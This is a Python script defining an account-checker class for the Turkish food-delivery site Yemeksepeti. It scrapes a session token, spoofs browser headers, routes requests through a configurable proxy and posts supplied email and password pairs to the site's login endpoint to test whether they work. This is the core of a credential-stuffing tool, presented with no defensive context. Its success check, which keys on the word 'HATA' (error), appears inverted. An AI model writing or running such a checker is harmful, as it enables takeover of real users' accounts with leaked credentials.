import requests

class YemeksepetiChecker:
    def __init__(self) -> None:
        self.session = requests.session()

    def setCountry(self, country):
        try:
            self.country = country
            return True
        except:
            return False

    def setAccount(self, mail, pwd):
        try:
            self.mail = mail
            self.password = pwd
            return True
        except:
            return False
    def setProxy(self, ip, port, type):
        try:
            return self.session.proxies.update({type: type+'://' + ip + port})
        except:
            return False

    def getToken(self):
        try:
            self.session.headers.update({'user-agent': 'Mozilla/5.0'})
            r = self.session.get(f'https://www.yemeksepeti.com/{self.country}')
            return r.cookies.get_dict()["anonymToken"]
        except:
            return False

    def check(self, token):
        try:
            headers = {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "tr-TR,tr;q=0.9",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://www.yemeksepeti.com",
                "referer": f"https://www.yemeksepeti.com/{self.country}",
                "upgrade-insecure-requests": "1",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
            }

            self.session.headers.update(headers)

            payload = {"ysRequest":{"Token":token,"CatalogName":"TR_"+self.country,"Culture":"tr-TR","LanguageId":"tr-TR"},"UserName":self.mail,"Password":self.password,"RememberMe":'true'}

            r = self.session.post('https://www.yemeksepeti.com/giris', data=payload)
            try:
                if 'HATA' in r.text:
                    return True
                else:
                    return False
            except:
                return False
        except:
            return False

